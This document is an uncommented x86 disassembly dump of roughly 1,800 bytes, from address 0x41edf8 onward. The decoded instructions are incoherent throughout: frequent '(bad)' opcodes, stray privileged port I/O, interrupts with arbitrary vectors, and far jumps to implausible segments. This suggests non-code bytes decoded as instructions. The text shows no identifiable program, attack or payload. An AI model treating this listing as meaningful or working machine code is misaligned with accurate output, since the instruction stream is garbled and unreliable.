  41edf8:	sub    cl,bl
  41edfa:	pop    edx
  41edfb:	popa   
  41edfc:	fmulp  st(4),st
  41edfe:	cld    
  41edff:	fdiv   st(4),st
  41ee01:	ficomp DWORD PTR [ebp-0x8]
  41ee04:	sub    al,0x89
  41ee06:	sub    al,0xbc
  41ee08:	pop    es
  41ee09:	add    esp,DWORD PTR [edi-0x5d286f0f]
  41ee0f:	jo     0x41ee5a
  41ee11:	out    dx,eax
  41ee12:	dec    ecx
  41ee13:	data16 test bh,dh
  41ee16:	loopne 0x41ee17
  41ee18:	adc    DWORD PTR [ebx+ebp*8+0x3],esi
  41ee1c:	jmp    0x41ee0b
  41ee1e:	sbb    esi,DWORD PTR [esi+0x70]
  41ee21:	nop
  41ee22:	retf   
  41ee23:	mov    ebx,0x1d6de0bb
  41ee28:	ror    dl,1
  41ee2a:	jo     0x41ee91
  41ee2c:	adc    esp,edx
  41ee2e:	fild   WORD PTR [edi]
  41ee30:	repz xlat BYTE PTR ds:[ebx]
  41ee32:	retf   0xb18c
  41ee35:	add    al,0xc0
  41ee37:	adc    eax,0x1dc0600a
  41ee3c:	sbb    DWORD PTR [edi+ebx*4+0x20e06652],0x7c93a51a
  41ee47:	cwde   
  41ee48:	jnp    0x41ee7e
  41ee4a:	gs mov al,0x9b
  41ee4d:	mov    ecx,0xd57e575d
  41ee52:	sbb    DWORD PTR [ebx+edi*2-0x71],0x35227516
  41ee5a:	mov    DWORD PTR [edx-0x357b7dc6],0xc86056b7
  41ee64:	ins    BYTE PTR es:[edi],dx
  41ee65:	mov    ds:0xc076410e,eax
  41ee6a:	jle    0x41ee2b
  41ee6c:	mov    dh,0xe5
  41ee6e:	retf   
  41ee6f:	or     DWORD PTR [esi+0x6a],0x25
  41ee73:	stos   BYTE PTR es:[edi],al
  41ee74:	aaa    
  41ee75:	mov    DWORD PTR [ebx+0x36],edi
  41ee78:	out    dx,eax
  41ee79:	and    al,0x71
  41ee7b:	inc    edx
  41ee7c:	ja     0x41ee32
  41ee7e:	mov    esi,0xce5d8b86
  41ee83:	mov    ah,0x26
  41ee85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee86:	cmp    DWORD PTR [edi+0x2be80c4e],edx
  41ee8c:	rol    DWORD PTR [edi+0xb10ad4],0x5
  41ee93:	xchg   edx,eax
  41ee94:	addr16 loopne 0x41ee17
  41ee97:	aam    0x6
  41ee99:	int    0xc6
  41ee9b:	add    al,0x90
  41ee9d:	xchg   esi,eax
  41ee9e:	add    al,0xba
  41eea0:	pop    ecx
  41eea1:	cs jno 0x41ef1c
  41eea4:	dec    edx
  41eea5:	or     edx,ebp
  41eea7:	arpl   WORD PTR [edi],cx
  41eea9:	xchg   dh,bh
  41eeab:	xchg   dx,ax
  41eead:	xor    esi,DWORD PTR [esi-0x7ecbce4e]
  41eeb3:	int    0xd
  41eeb5:	out    dx,eax
  41eeb6:	shl    DWORD PTR [eax+0x7e791c26],1
  41eebc:	loopne 0x41ee7e
  41eebe:	(bad)  
  41eebf:	rcr    DWORD PTR [edx+0x74236baf],cl
  41eec5:	inc    edi
  41eec6:	fidiv  DWORD PTR [edi+0x47]
  41eec9:	scas   eax,DWORD PTR es:[edi]
  41eeca:	add    bh,ah
  41eecc:	aam    0x70
  41eece:	mov    BYTE PTR [eax+0x63],ah
  41eed1:	stc    
  41eed2:	ret    0x38f5
  41eed5:	cmp    BYTE PTR [eax-0x2b8b751],dl
  41eedb:	in     eax,dx
  41eedc:	lds    esi,FWORD PTR [edx+eax*4-0x72]
  41eee0:	mov    eax,0x2c12888d
  41eee5:	xchg   esi,eax
  41eee6:	je     0x41ef30
  41eee8:	sbb    eax,0x3f1f8b19
  41eeed:	pusha  
  41eeee:	into   
  41eeef:	jl     0x41ef60
  41eef1:	punpckhbw mm2,mm6
  41eef4:	sbb    BYTE PTR [ebp+0x7c4e92f0],0x3b
  41eefb:	dec    eax
  41eefc:	fwait
  41eefd:	mov    edx,0xd5b223f3
  41ef02:	pop    ss
  41ef03:	or     ebp,DWORD PTR cs:[esi-0x3c5da064]
  41ef0a:	push   es
  41ef0b:	ja     0x41eec5
  41ef0d:	lahf   
  41ef0e:	ds push ebx
  41ef10:	ins    DWORD PTR es:[edi],dx
  41ef11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef12:	xchg   ebp,eax
  41ef13:	clc    
  41ef14:	xchg   ebx,eax
  41ef15:	scas   al,BYTE PTR es:[edi]
  41ef16:	scas   eax,DWORD PTR es:[edi]
  41ef17:	push   0x74b691bb
  41ef1c:	mov    ds:0x56b0d5ff,al
  41ef21:	(bad)
  41ef26:	addr16 inc ecx
  41ef28:	jecxz  0x41ef07
  41ef2a:	test   al,0x98
  41ef2c:	mov    ah,0xa5
  41ef2e:	jno    0x41ef22
  41ef30:	and    DWORD PTR [ebp-0x604cfa0d],ebx
  41ef36:	mov    ah,0x6e
  41ef38:	inc    esp
  41ef39:	test   BYTE PTR [esi+0x23],ah
  41ef3c:	je     0x41ef5a
  41ef3e:	ins    BYTE PTR es:[edi],dx
  41ef3f:	lahf   
  41ef40:	jae    0x41ef17
  41ef42:	xchg   ebx,eax
  41ef43:	or     ch,bh
  41ef45:	dec    ebx
  41ef46:	cld    
  41ef47:	push   cs
  41ef48:	xlat   BYTE PTR ds:[ebx]
  41ef49:	dec    eax
  41ef4a:	push   ecx
  41ef4b:	pop    ecx
  41ef4c:	sbb    BYTE PTR [ebx],0xaa
  41ef4f:	mov    esp,0x3f05839c
  41ef54:	loop   0x41ef08
  41ef56:	or     edi,edx
  41ef58:	mov    WORD PTR [ebx-0x6ff9b4d0],cs
  41ef5e:	push   DWORD PTR [edx+edi*4-0x36]
  41ef62:	popa   
  41ef63:	das    
  41ef64:	mov    ch,BYTE PTR [ebx]
  41ef66:	and    ecx,DWORD PTR [esi-0x60]
  41ef69:	ret    0x52a3
  41ef6c:	scas   eax,DWORD PTR es:[edi]
  41ef6d:	lods   eax,DWORD PTR ds:[esi]
  41ef6e:	adc    BYTE PTR [ebx+0x34],dh
  41ef71:	shl    edx,1
  41ef73:	xchg   edx,eax
  41ef74:	dec    esi
  41ef75:	retf   
  41ef76:	aas    
  41ef77:	add    eax,0x3fc9cfe6
  41ef7c:	pop    esi
  41ef7d:	push   0xffffff95
  41ef7f:	sbb    eax,0xb258c3cd
  41ef84:	mov    ch,0x48
  41ef86:	xchg   ebx,eax
  41ef87:	loopne 0x41ef81
  41ef89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef8a:	mov    cl,0x2d
  41ef8c:	mov    ds:0x68f262f0,al
  41ef91:	inc    ebp
  41ef92:	push   ss
  41ef93:	jle    0x41efa1
  41ef95:	pop    edi
  41ef96:	inc    edi
  41ef97:	imul   edi,DWORD PTR [ebx],0xfffffff4
  41ef9a:	out    0x5,al
  41ef9c:	inc    ebx
  41ef9d:	and    eax,0xc7ea008
  41efa2:	lea    eax,[ecx]
  41efa4:	fbld   TBYTE PTR [ecx]
  41efa6:	adc    eax,0xb625becd
  41efab:	in     al,dx
  41efac:	adc    edx,edi
  41efae:	mov    ebx,0xd297e959
  41efb3:	pop    ds
  41efb4:	and    al,0xcf
  41efb6:	imul   edi,DWORD PTR [eax+0x2e3bc6d7],0xffffffea
  41efbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efbe:	and    bl,BYTE PTR [ebx+0x71ddbbac]
  41efc4:	jp     0x41eff8
  41efc6:	jno    0x41f033
  41efc8:	or     ch,BYTE PTR [esp+edx*4+0x1a]
  41efcc:	jl     0x41f037
  41efce:	jl     0x41f01e
  41efd0:	arpl   WORD PTR [ebx+ecx*4],bx
  41efd3:	das    
  41efd4:	shl    DWORD PTR [esi],1
  41efd6:	scas   al,BYTE PTR es:[edi]
  41efd7:	arpl   bx,cx
  41efd9:	daa    
  41efda:	mov    BYTE PTR [ebp+ecx*4-0x70],0xfb
  41efdf:	(bad)  
  41efe0:	mov    eax,ds:0x6b02c444
  41efe5:	out    0x64,eax
  41efe7:	push   ebp
  41efe8:	mov    bh,0x9d
  41efea:	aam    0xd
  41efec:	stos   BYTE PTR es:[edi],al
  41efed:	push   0x8
  41efef:	inc    eax
  41eff0:	mov    edx,0xce348635
  41eff5:	imul   BYTE PTR cs:[edi-0x3a]
  41eff9:	xor    eax,0x11da0754
  41effe:	mov    cl,0x4
  41f000:	adc    ebp,DWORD PTR [edx+0x3a]
  41f003:	or     ecx,eax
  41f005:	jne    0x41f077
  41f007:	scas   al,BYTE PTR es:[edi]
  41f008:	push   eax
  41f009:	xchg   esi,eax
  41f00a:	or     BYTE PTR [ecx],0x1a
  41f00d:	add    DWORD PTR [eax+0x1a1dfb54],esp
  41f013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f014:	sbb    ch,BYTE PTR [ecx+ebp*2-0x3f]
  41f018:	inc    edi
  41f019:	pop    ebp
  41f01a:	sbb    al,0x4b
  41f01c:	xchg   BYTE PTR [esi],bh
  41f01e:	aam    0x42
  41f020:	push   cs
  41f021:	pushf  
  41f022:	xchg   ebx,eax
  41f023:	hlt    
  41f024:	out    dx,al
  41f025:	test   ebp,esp
  41f027:	sbb    al,0xbd
  41f029:	xchg   edx,eax
  41f02a:	and    eax,0xc5ad46a9
  41f02f:	jle    0x41efe5
  41f031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f032:	icebp  
  41f033:	cmp    DWORD PTR [eax+0x618ce8a4],esi
  41f039:	adc    ch,bh
  41f03b:	lods   al,BYTE PTR ds:[esi]
  41f03c:	shr    BYTE PTR [edi+eax*8-0x5679f5e1],1
  41f043:	inc    eax
  41f044:	popa   
  41f045:	pop    esp
  41f046:	les    ebp,FWORD PTR [ebp+eax*1+0x33]
  41f04a:	cli    
  41f04b:	das    
  41f04c:	pop    eax
  41f04d:	iret   
  41f04e:	jp     0x41f052
  41f050:	cmp    ebp,ebx
  41f052:	xor    BYTE PTR [edx+0x1ed24e09],bl
  41f058:	cmc    
  41f059:	or     esi,DWORD PTR [ebx-0x15]
  41f05c:	jae    0x41f054
  41f05e:	sbb    eax,0xab3dfb6b
  41f063:	cmp    al,0x39
  41f065:	cmp    BYTE PTR [ebx+0x39],bh
  41f068:	int    0xea
  41f06a:	mov    ds,esi
  41f06c:	xor    esp,ecx
  41f06e:	test   dh,dh
  41f070:	lahf   
  41f071:	int3   
  41f072:	inc    edi
  41f073:	loopne 0x41f019
  41f075:	sbb    eax,0x5635f282
  41f07a:	popf   
  41f07b:	xchg   esp,eax
  41f07c:	sar    DWORD PTR [edi+ebp*1],0x5d
  41f080:	rcr    BYTE PTR [ecx-0x3d0b940],0x6
  41f087:	inc    esp
  41f088:	add    eax,0x48f4f093
  41f08d:	jne    0x41f041
  41f08f:	test   eax,0xfe6ee24c
  41f094:	mov    esi,DWORD PTR fs:[edx+0x42c9054c]
  41f09b:	jo     0x41f0d5
  41f09d:	data16 mov gs,WORD PTR [esi+0x461820fb]
  41f0a4:	jle    0x41f119
  41f0a6:	xchg   esp,eax
  41f0a7:	rcr    DWORD PTR [eax],0x4f
  41f0aa:	dec    edx
  41f0ab:	xor    ecx,DWORD PTR [edi+0x6d614527]
  41f0b1:	rol    BYTE PTR [ecx-0x1d68d6ed],0xc1
  41f0b8:	add    BYTE PTR [ecx],ch
  41f0ba:	dec    eax
  41f0bb:	aas    
  41f0bc:	loopne 0x41f0fc
  41f0be:	push   esi
  41f0bf:	add    ebx,0xe0ee507a
  41f0c5:	sbb    DWORD PTR gs:[edx],esi
  41f0c8:	jle    0x41f0e1
  41f0ca:	cmp    eax,0xd73c4d2a
  41f0cf:	adc    al,0xf8
  41f0d1:	sub    al,0x41
  41f0d3:	pop    ss
  41f0d4:	mov    dl,0xc9
  41f0d6:	(bad)
  41f0da:	call   0xc072fe04
  41f0df:	cmp    DWORD PTR gs:[ebx+0x58],ecx
  41f0e3:	xchg   edx,eax
  41f0e4:	mov    edi,0xf33ec83f
  41f0e9:	test   cl,bl
  41f0eb:	xlat   BYTE PTR ds:[ebx]
  41f0ec:	hlt    
  41f0ed:	add    BYTE PTR [edi-0x65],bh
  41f0f0:	xchg   ecx,eax
  41f0f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0f2:	pop    ss
  41f0f3:	cmp    eax,0x63566b96
  41f0f8:	and    eax,0xa0744644
  41f0fd:	mov    ds:0x78028bde,al
  41f102:	setge  BYTE PTR [ecx+0x53]
  41f106:	mov    ds:0xd319a788,al
  41f10b:	push   ebx
  41f10c:	inc    esp
  41f10d:	dec    esp
  41f10e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f10f:	push   edx
  41f110:	in     al,dx
  41f111:	cmp    ecx,DWORD PTR [esi+0x35ab11fc]
  41f117:	in     eax,dx
  41f118:	ins    BYTE PTR es:[edi],dx
  41f119:	dec    eax
  41f11a:	das    
  41f11b:	fldl2e 
  41f11d:	mov    dl,0x15
  41f11f:	add    DWORD PTR [edx],eax
  41f121:	adc    al,0xf5
  41f123:	scas   al,BYTE PTR es:[edi]
  41f124:	jbe    0x41f135
  41f126:	xchg   ebx,eax
  41f127:	addr16 dec eax
  41f129:	cld    
  41f12a:	push   edx
  41f12b:	push   ds
  41f12c:	ja     0x41f0f4
  41f12e:	sti    
  41f12f:	je     0x41f144
  41f131:	push   ebp
  41f132:	(bad)  
  41f133:	pop    ebx
  41f134:	push   0x65682d82
  41f139:	repz in eax,dx
  41f13b:	outs   dx,BYTE PTR ds:[esi]
  41f13c:	fcom   DWORD PTR [ecx]
  41f13e:	cmp    esi,DWORD PTR [edx+eiz*2-0x13]
  41f142:	cmp    eax,0x1a46ac10
  41f147:	fdivp  st(5),st
  41f149:	mov    ebx,0xd8f696a0
  41f14e:	es xchg ebp,eax
  41f150:	or     al,0x2d
  41f152:	inc    ebx
  41f153:	and    ebp,DWORD PTR [esi]
  41f155:	push   es
  41f156:	scas   eax,DWORD PTR es:[edi]
  41f157:	dec    edx
  41f158:	(bad)  
  41f159:	loop   0x41f0ea
  41f15b:	mov    ecx,0xaa3565a
  41f160:	pop    ss
  41f161:	sbb    ah,BYTE PTR [eax]
  41f163:	mov    esp,0xbf447cc6
  41f168:	aas    
  41f169:	icebp  
  41f16a:	pusha  
  41f16b:	fucomp st(0)
  41f16d:	popa   
  41f16e:	jecxz  0x41f187
  41f170:	add    edx,esp
  41f172:	and    eax,0x66025797
  41f177:	sbb    eax,0xa93bebe3
  41f17d:	mov    ds:0x11fd1031,al
  41f182:	ins    DWORD PTR es:[edi],dx
  41f183:	sub    eax,0x65e3ecfa
  41f188:	hlt    
  41f189:	in     al,dx
  41f18a:	shl    bh,1
  41f18c:	je     0x41f192
  41f18e:	in     al,dx
  41f18f:	ins    DWORD PTR es:[edi],dx
  41f190:	inc    esp
  41f191:	and    esp,esp
  41f193:	sbb    esi,edi
  41f195:	mov    eax,0x51483cce
  41f19a:	jp     0x41f166
  41f19c:	xor    DWORD PTR [ebx],0x79
  41f19f:	cmp    eax,0x2961ebc5
  41f1a4:	and    eax,0x36d1846c
  41f1a9:	call   0x7d82a43a
  41f1ae:	call   0x2a48:0xd36703d4
  41f1b5:	adc    DWORD PTR [esi+0x1d2f36af],edi
  41f1bb:	add    al,0xf6
  41f1bd:	mov    DWORD PTR [ebp+ecx*4-0x2e],esi
  41f1c1:	sbb    eax,0x2ab44895
  41f1c6:	dec    edi
  41f1c7:	arpl   WORD PTR ds:0xe1964696,di
  41f1cd:	push   0xf4fe3c5e
  41f1d2:	popa   
  41f1d3:	add    eax,0xf5e426b6
  41f1d8:	mov    ds:0xaab5a1a7,eax
  41f1dd:	pop    edx
  41f1de:	shl    BYTE PTR [eax],cl
  41f1e0:	and    DWORD PTR [esi],ecx
  41f1e2:	fwait
  41f1e3:	enter  0x959c,0xea
  41f1e7:	dec    edi
  41f1e8:	and    eax,0xcb2dceac
  41f1ed:	aas    
  41f1ee:	fnstsw WORD PTR ds:0x99eccfdc
  41f1f4:	adc    BYTE PTR [edx+ebp*2],dl
  41f1f7:	jmp    0x41f1c1
  41f1f9:	add    esp,edx
  41f1fb:	jo     0x41f21a
  41f1fd:	loop   0x41f1ff
  41f1ff:	mov    al,ds:0x1e39ef7d
  41f204:	inc    eax
  41f205:	fidiv  WORD PTR [edx-0x21]
  41f208:	mov    ebx,0x573d455b
  41f20d:	ins    DWORD PTR es:[edi],dx
  41f20e:	aad    0x4b
  41f210:	cld    
  41f211:	dec    esi
  41f212:	mov    eax,0xe68d9a79
  41f217:	loop   0x41f218
  41f219:	(bad)  
  41f21a:	or     DWORD PTR [ebp+edi*1-0x65],ebx
  41f21e:	popa   
  41f21f:	and    cl,cl
  41f221:	mov    eax,ds:0x1a5ef311
  41f226:	pop    ss
  41f227:	inc    esp
  41f228:	fimul  DWORD PTR [eax+0x49]
  41f22b:	test   al,0x90
  41f22d:	mov    esi,DWORD PTR [ebx]
  41f22f:	dec    esp
  41f230:	sti    
  41f231:	add    bl,BYTE PTR [edx+0x484a505b]
  41f237:	push   ecx
  41f238:	iret   
  41f239:	add    dl,BYTE PTR [edx-0x6bd593ff]
  41f23f:	pop    eax
  41f240:	xchg   ebp,eax
  41f241:	sbb    DWORD PTR [esi],0x3c6da5a
  41f247:	leave  
  41f248:	pop    ebp
  41f249:	ins    DWORD PTR es:[edi],dx
  41f24a:	push   0x75b0549a
  41f24f:	lea    edi,[edi]
  41f251:	ins    BYTE PTR es:[edi],dx
  41f252:	dec    ebp
  41f253:	cmp    BYTE PTR [edx+0x558c5295],ah
  41f259:	test   BYTE PTR [ebx],dl
  41f25b:	push   es
  41f25c:	adc    dl,BYTE PTR ds:0x181a2034
  41f262:	xchg   esi,eax
  41f263:	xchg   ebx,eax
  41f264:	jle    0x41f278
  41f266:	xor    eax,0x454eea1
  41f26b:	popf   
  41f26c:	in     al,0x1e
  41f26e:	imul   edi,DWORD PTR [edi],0xffffffe1
  41f271:	xchg   ebp,eax
  41f272:	mov    bh,0x88
  41f274:	push   edi
  41f275:	xlat   BYTE PTR ds:[ebx]
  41f276:	pop    ss
  41f277:	in     eax,dx
  41f278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f279:	icebp  
  41f27a:	fwait
  41f27b:	hlt    
  41f27c:	shr    eax,0x6c
  41f27f:	pusha  
  41f280:	push   ebp
  41f281:	inc    eax
  41f282:	jne    0x41f21a
  41f284:	mov    cl,0x64
  41f286:	mov    DWORD PTR [ecx+eiz*8+0x44],edx
  41f28a:	mov    DWORD PTR [edi+0x46406bf8],ebp
  41f290:	sbb    cl,BYTE PTR [eax]
  41f292:	scas   al,BYTE PTR es:[edi]
  41f293:	mov    al,ds:0x832cd8fc
  41f298:	ret    
  41f299:	lock (bad) 
  41f29b:	ds es jo 0x41f2a8
  41f29f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2a0:	les    eax,FWORD PTR [eax+0x5]
  41f2a3:	pop    esp
  41f2a4:	ror    DWORD PTR [eax],1
  41f2a6:	sbb    DWORD PTR [edi-0x6de601a1],0x42ea4ded
  41f2b0:	lahf   
  41f2b1:	lods   eax,DWORD PTR ds:[esi]
  41f2b2:	iret   
  41f2b3:	xor    eax,esp
  41f2b5:	hlt    
  41f2b6:	and    cl,BYTE PTR [ebp+0x36]
  41f2b9:	icebp  
  41f2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2bb:	jbe    0x41f2db
  41f2bd:	xchg   ebp,eax
  41f2be:	inc    edx
  41f2bf:	aas    
  41f2c0:	lock call 0x37bb:0x333acf88
  41f2c8:	jp     0x41f300
  41f2ca:	push   eax
  41f2cb:	std    
  41f2cc:	push   edi
  41f2ce:	jmp    0xe217:0xcfa27777
  41f2d5:	jmp    0x41f2e5
  41f2d7:	push   edi
  41f2d8:	popf   
  41f2d9:	xchg   ecx,eax
  41f2da:	test   eax,0xe21159a3
  41f2df:	ds jecxz 0x41f341
  41f2e2:	mov    ebp,0x7ceb5624
  41f2e7:	xchg   ebp,eax
  41f2e8:	lds    esi,FWORD PTR [ecx+0x5]
  41f2eb:	daa    
  41f2ec:	mov    bl,0x6e
  41f2ee:	stos   BYTE PTR es:[edi],al
  41f2ef:	cli    
  41f2f0:	in     eax,0xd5
  41f2f2:	sbb    eax,0x67b4c93c
  41f2f7:	cmp    esi,ebp
  41f2f9:	scas   eax,DWORD PTR es:[edi]
  41f2fa:	das    
  41f2fb:	(bad)  
  41f2fc:	imul   ebx,DWORD PTR [ecx+0xb],0xffffffae
  41f300:	addr16 loopne 0x41f29d
  41f303:	into   
  41f304:	sub    eax,0xb650d59d
  41f309:	outs   dx,DWORD PTR ds:[esi]
  41f30a:	test   eax,0x5ab050a8
  41f30f:	add    ecx,esp
  41f311:	sbb    eax,0xb09dc464
  41f316:	jno    0x41f2d1
  41f318:	mov    eax,ds:0x5dd460d8
  41f31d:	xlat   BYTE PTR ds:[ebx]
  41f31e:	in     al,0x82
  41f320:	pop    ss
  41f321:	or     BYTE PTR [ebx-0x2d25cc62],0x71
  41f328:	push   esp
  41f329:	icebp  
  41f32a:	sbb    esi,ebx
  41f32c:	cli    
  41f32d:	or     al,BYTE PTR [edi]
  41f32f:	push   ecx
  41f330:	fs addr16 and eax,0xc6d779c5
  41f337:	ss mov ebp,0xc7a0a98d
  41f33d:	add    eax,0xee53bbee
  41f342:	pop    ds
  41f343:	(bad)
  41f346:	out    0x88,al
  41f348:	ss jmp 0x41f337
  41f34b:	dec    eax
  41f34c:	in     al,0xc5
  41f34e:	and    ebp,DWORD PTR [ebx+0x38]
  41f351:	adc    ch,BYTE PTR [ecx]
  41f353:	push   cs
  41f354:	mov    ah,0x5
  41f356:	pop    ss
  41f357:	test   DWORD PTR [edi+edi*1-0x22],esp
  41f35b:	stos   BYTE PTR es:[edi],al
  41f35c:	setne  bh
  41f35f:	dec    ecx
  41f360:	mov    al,ds:0x61b333a0
  41f365:	mov    al,ds:0x2687e533
  41f36a:	lds    esp,FWORD PTR [eax+0x26]
  41f36d:	popf   
  41f36e:	loope  0x41f3e1
  41f370:	mov    ds:0xa5d72e5,al
  41f375:	dec    esi
  41f376:	scas   al,BYTE PTR es:[edi]
  41f377:	imul   ecx,DWORD PTR [ebx],0x12
  41f37a:	ja     0x41f3c0
  41f37c:	jno    0x41f3dc
  41f37e:	enter  0x170d,0xf1
  41f382:	xor    eax,0xe1134762
  41f387:	pop    eax
  41f388:	out    dx,al
  41f389:	fst    QWORD PTR [edx+0x5f]
  41f38c:	outs   dx,DWORD PTR ds:[esi]
  41f38d:	dec    edi
  41f38e:	enter  0x6492,0xc7
  41f392:	pushf  
  41f393:	sub    cl,BYTE PTR [ecx-0x4d]
  41f396:	sbb    cl,BYTE PTR ds:0x7bf8a10
  41f39c:	xchg   ebp,eax
  41f39d:	out    0x97,eax
  41f39f:	add    dh,dh
  41f3a1:	les    esi,FWORD PTR [esi-0x2a99dfc4]
  41f3a7:	stos   DWORD PTR es:[edi],eax
  41f3a8:	sub    dl,bl
  41f3aa:	or     DWORD PTR [edi-0x14cccaba],esp
  41f3b0:	mov    bl,0x81
  41f3b2:	mov    ch,0x4b
  41f3b4:	fcmovnb st,st(5)
  41f3b6:	xchg   ebp,eax
  41f3b7:	dec    esp
  41f3b8:	sub    eax,0x3c363c2c
  41f3bd:	hlt    
  41f3be:	fidiv  DWORD PTR [edi+0x2198d10f]
  41f3c4:	(bad)  
  41f3c5:	(bad)  
  41f3c7:	sbb    ch,dl
  41f3c9:	(bad)  
  41f3ca:	loop   0x41f389
  41f3cc:	ja     0x41f40f
  41f3ce:	bound  ebp,QWORD PTR [ecx-0x1e]
  41f3d1:	jmp    0x8bd30d79
  41f3d6:	iret   
  41f3d7:	inc    edi
  41f3d8:	adc    BYTE PTR [ecx-0x3c03fd6f],0x60
  41f3df:	mov    ebp,0xd1b3579a
  41f3e4:	bound  ecx,QWORD PTR [esi]
  41f3e6:	mov    bh,0x7a
  41f3e8:	retf   
  41f3e9:	cwde   
  41f3ea:	(bad)  
  41f3ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3ee:	mov    ch,0xed
  41f3f0:	int    0xc2
  41f3f2:	push   esi
  41f3f3:	xor    DWORD PTR [edx+eax*4+0x3c],esp
  41f3f7:	sbb    al,0x50
  41f3f9:	clc    
  41f3fa:	jecxz  0x41f3ba
  41f3fc:	jge    0x41f3b7
  41f3fe:	das    
  41f3ff:	or     ch,BYTE PTR [esi+edi*2]
  41f402:	cli    
  41f403:	jno    0x41f439
  41f405:	xchg   esi,eax
  41f406:	mov    ds:0xfc593abc,eax
  41f40b:	xchg   esp,eax
  41f40c:	dec    esp
  41f40d:	dec    ebx
  41f40e:	std    
  41f40f:	test   BYTE PTR [esi-0x2cc8d04b],al
  41f415:	loop   0x41f46b
  41f417:	das    
  41f418:	mov    ds:0xa4f23431,al
  41f41d:	mov    ds:0x79138524,al
  41f422:	das    
  41f423:	xchg   esp,eax
  41f424:	jns    0x41f3ea
  41f426:	in     eax,dx
  41f427:	cmp    al,0xc0
  41f429:	(bad)  
  41f42a:	inc    edx
  41f42b:	lods   al,BYTE PTR ds:[esi]
  41f42c:	in     eax,dx
  41f42d:	mov    BYTE PTR [ebx+edi*8],cl
  41f430:	daa    
  41f431:	dec    ebp
  41f432:	(bad)  
  41f433:	mov    cl,0xb3
  41f435:	retf   
  41f436:	xchg   BYTE PTR [edx+ebp*8-0x55129ed2],dh
  41f43d:	dec    eax
  41f43e:	mov    bl,0x99
  41f440:	adc    BYTE PTR [ebp-0x23],ah
  41f443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f444:	(bad)  
  41f445:	mov    DWORD PTR [esi],ecx
  41f447:	cdq    
  41f448:	inc    edx
  41f449:	fwait
  41f44a:	xchg   edx,eax
  41f44b:	dec    esi
  41f44c:	dec    ecx
  41f44d:	ss mov edi,0xafcb6c3d
  41f453:	jns    0x41f42c
  41f455:	aaa    
  41f456:	mov    ds:0x9c97fccb,al
  41f45b:	in     al,dx
  41f45c:	inc    esi
  41f45d:	lods   eax,DWORD PTR ds:[esi]
  41f45e:	jo     0x41f3e7
  41f460:	sbb    esi,DWORD PTR [esi-0x7515ce0d]
  41f466:	sbb    BYTE PTR [ebx+0x2176191f],ah
  41f46c:	mov    esp,0xec9c9e67
  41f471:	xchg   ecx,eax
  41f472:	mov    ebp,0x2401b84b
  41f477:	int3   
  41f478:	and    esp,DWORD PTR [ebx]
  41f47a:	scas   eax,DWORD PTR es:[edi]
  41f47b:	pop    ebp
  41f47c:	and    dh,BYTE PTR [edx]
  41f47e:	and    ah,BYTE PTR [edi]
  41f480:	dec    ecx
  41f481:	out    0xaa,eax
  41f483:	or     DWORD PTR [edx],edi
  41f485:	test   eax,0x5acd4ce5
  41f48a:	cmp    al,0xb0
  41f48c:	js     0x41f4a5
  41f48e:	xchg   DWORD PTR [edx-0x314bf418],ebp
  41f494:	rol    DWORD PTR [ebx+ebx*2],cl
  41f497:	jmp    0x598d720d
  41f49c:	dec    ebp
  41f49d:	in     eax,dx
  41f49e:	xor    eax,0xa15baa35
  41f4a3:	lock pop esp
  41f4a5:	fndisi(8087 only) 
  41f4a7:	jg     0x41f4a6
  41f4a9:	in     al,dx
  41f4aa:	mov    cl,0xf0
  41f4ac:	enter  0xf905,0x2a
  41f4b0:	mov    ecx,0x9c32bf70
  41f4b5:	sahf   
  41f4b6:	mov    al,ds:0x85c7ca3a
  41f4bb:	adc    BYTE PTR [bx+si-0x5120],al
  41f4c0:	in     eax,dx
  41f4c1:	fimul  DWORD PTR [edx+eax*2+0xb]
  41f4c5:	or     eax,0x1975775b
  41f4ca:	ins    BYTE PTR es:[edi],dx
  41f4cb:	ss (bad) 
  41f4cd:	shl    BYTE PTR [esi-0x1a],cl
  41f4d0:	mov    dh,0x63
  41f4d2:	jle    0x41f4f3
  41f4d4:	or     ecx,DWORD PTR ds:0x31d13ede
  41f4da:	cmp    eax,0xad891612
  41f4df:	cmp    ecx,DWORD PTR [ebp+0x29]
  41f4e2:	ds mov edx,0x751cbcb8
  41f4e8:	outs   dx,DWORD PTR ds:[esi]
  41f4e9:	add    eax,0xedabb57
  41f4ee:	fld    QWORD PTR [esi-0x6448409]
  41f4f4:	dec    edx
  41f4f5:	ins    DWORD PTR es:[edi],dx
  41f4f6:	(bad)  [ebx+edx*8]
  41f4f9:	fsub   QWORD PTR [ecx-0x64]
  41f4fc:	push   esi
  41f4fd:	iret   
  41f4fe:	xchg   ebp,eax
  41f4ff:	sbb    BYTE PTR [edi+0x2abbbe6c],al
  41f505:	adc    BYTE PTR [eax],0x8
  41f508:	xor    eax,0x87550a95
  41f50d:	or     esp,DWORD PTR [esi]
  41f50f:	xchg   edx,eax
  41f510:	sti    
  41f511:	idiv   ch
  41f513:	ficom  WORD PTR [ebp+0x37]
  41f516:	mov    ch,0x7a
  41f518:	xor    BYTE PTR [eax-0x68],bh
  41f51b:	push   edx
  41f51c:	test   DWORD PTR ss:[eax+0x52],0x5a862fe6
  41f524:	add    BYTE PTR [ebp-0x7e47e886],dh
  41f52a:	stos   DWORD PTR es:[edi],eax
  41f52b:	ret    
  41f52c:	test   DWORD PTR [edi-0x4f7993f1],esi
  41f532:	loop   0x41f4b4
  41f534:	ds mov bl,0x65
  41f537:	mov    bh,0x1a
  41f539:	xchg   ecx,eax
  41f53a:	mov    ecx,0xce3e5989
  41f53f:	stos   DWORD PTR es:[edi],eax
  41f540:	(bad)  
  41f541:	sti    
  41f542:	loopne 0x41f55d
  41f544:	xor    al,BYTE PTR [eax+0x72]
  41f547:	lock pop edi
  41f549:	dec    ecx
